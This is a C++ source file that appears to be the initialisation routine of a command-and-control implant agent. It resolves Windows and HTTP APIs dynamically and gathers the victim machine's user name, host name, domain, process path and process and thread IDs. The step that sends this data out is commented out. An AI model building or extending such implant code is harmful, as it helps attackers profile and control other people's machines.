#include "common.hpp"
#include "apidefs.hpp"
#include "bytes.hpp"
#include <stdio.h>
#include "nt.hpp"

WINAPIS* WinApis = NULL;
HTTPAPIS* HttpApis = NULL;
MODULES* kModules = NULL;

BOOL InitAgent() {
	
	WinApis =  AllocMemory <WINAPIS>   (sizeof(struct WINAPIS));
	HttpApis = AllocMemory <HTTPAPIS>  (sizeof(struct HTTPAPIS));
	kModules = AllocMemory <MODULES>   (sizeof(struct MODULES));
	g_ByteMgr = AllocMemory<bytes>     (sizeof(bytes));
	if (!LoadAPIS()) { return FALSE; }
	

	PCHAR CollectUser(DWORD * out);
	PCHAR CollectHost(DWORD * out);
	PCHAR CollectDomainName(DWORD * out);
	PCHAR CollectProcessPath(DWORD * out);

	DWORD UserLen, HostLen, DomainLen, ProcessPathLen;

	PCHAR User = CollectUser(&UserLen);
	PCHAR Host = CollectHost(&HostLen);
	PCHAR ProcessPath = CollectProcessPath(&ProcessPathLen);
	PCHAR Domain = CollectDomainName(&DomainLen);
	DWORD TID = (DWORD)(ULONG_PTR)GetTeb()->ClientId.UniqueThread;
	DWORD PID = (DWORD)(ULONG_PTR)GetTeb()->ClientId.UniqueProcess;
	
	//g_ByteMgr->InitWrite();

	if (User) { HeapFree(GetProcessHeap(), 0, User); }
	if (Host) { HeapFree(GetProcessHeap(), 0, Host); }
	if (Domain) { HeapFree(GetProcessHeap(), 0, Domain); }
	if (ProcessPath) { HeapFree(GetProcessHeap(), 0, ProcessPath); }
	return TRUE;

}





PCHAR CollectProcessPath(DWORD *out) {
	PCHAR buffer = AllocMemory<CHAR>(32767);

	DWORD Len = WinApis->GetModuleFileNameA(NULL, buffer, 32767);
	*out = Len;
	return buffer;


}


PCHAR CollectUser(DWORD *out) {
	DWORD BufSize = NULL;
	WinApis->GetUserNameA(NULL, &BufSize);
	PCHAR buffer = AllocMemory<CHAR>(BufSize);

	if (!WinApis->GetUserNameA(buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;

}


PCHAR CollectHost(DWORD* out) {
	DWORD BufSize = NULL;
	WinApis->GetComputerNameExA(ComputerNameDnsHostname, NULL, &BufSize);
	PCHAR buffer = AllocMemory<CHAR>(BufSize);

	if (!WinApis->GetComputerNameExA(ComputerNameDnsHostname, buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}


PCHAR CollectDomainName(DWORD* out) {
	DWORD BufSize = NULL;
	WinApis->GetComputerNameExA(ComputerNameDnsDomain, NULL, &BufSize);
	PCHAR buffer = AllocMemory<CHAR>(BufSize);

	if (!WinApis->GetComputerNameExA(ComputerNameDnsDomain, buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}




